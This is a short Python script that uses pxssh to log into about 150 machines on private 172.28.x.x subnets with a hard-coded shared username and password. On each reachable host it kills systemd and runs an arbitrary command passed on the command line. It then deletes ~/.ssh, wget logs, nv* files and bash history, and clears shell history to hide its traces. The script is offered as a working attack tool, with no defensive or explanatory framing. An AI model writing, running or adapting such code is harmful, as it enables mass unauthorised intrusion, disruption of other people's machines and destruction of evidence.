import pexpect
from pexpect import pxssh
import sys,os,shutil,socket

def xyz(ip,argv1):
	s = pxssh.pxssh()
	host1 = 'iiserb'
	s.force_password = True
	try :
		s.login(ip,host1,host1,login_timeout=1)
		s.sendline(' ping -w1 google.com &> /dev/null; echo $?')
		s.prompt()
		x = s.before
		if x.decode("utf-8")[-3]== '0':
			s.sendline(' killall systemd ')
			s.sendline(argv1+' &> /dev/null')
			s.sendline(' rm -r  ~/.ssh/  ~/wget-log ~/nv*  ~/.bash_history &> /dev/null')
			s.sendline(' history -c')
			print("ok")
		s.logout()
	except Exception as e :
		print ("Error!!!")






ip1 = ['172.28.123.'+str(2*i) for i in range(1,58)]
ip2 = ['172.28.154.'+str(2*i) for i in range(1,31)]
ip3 = ['172.28.155.'+str(2*i) for i in range(1,23)]
ip4 = ['172.28.122.'+str(2*i) for i in range(1,41)]
ips=ip1+ip2+ip3+ip4
for ip in ips:
	print(ip)
	xyz(ip,sys.argv[1])
